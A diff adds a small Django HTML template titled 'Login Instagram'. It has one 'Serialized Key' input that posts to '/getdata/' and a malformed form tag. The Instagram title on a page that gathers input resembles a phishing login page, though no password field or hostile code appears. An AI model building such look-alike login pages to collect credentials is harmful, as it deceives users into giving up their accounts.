@@ -1,0 +1,30 @@
+<html>
+<head><title>Login Instagram{% load static %}</title>
+    <link rel="stylesheet" type="text/css" href="{% static 'css/Stylesheet1.css' %}"/>
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css"
+          integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T"
+          crossorigin="anonymous">
+    </head>
+
+<body>
+    <div id="MainBody">
+        <div id="Container">
+            <div class="BorderContainer">
+                <img id="Ig" src="{% static 'imgs/bayern.png'%}" /><br>
+            <div id="Input-Section">
+                <form method="POST",action="/getdata/">
+                    <div class="input-group mb-3" id="textField">
+                         <input type="text" class="form-control" placeholder="Enter Serialized Key" aria-label="Username" aria-describedby="basic-addon1" id="user" name="user">
+                    </div>
+                   
+                          <button type="submit" class="btn btn-primary btn-lg btn-block" id="loginbtn">Authenticate</button>
+                    </div>
+                </form>
+              
+            </div>
+           
+        </div>
+    </div>
+
+</body>
+</html>
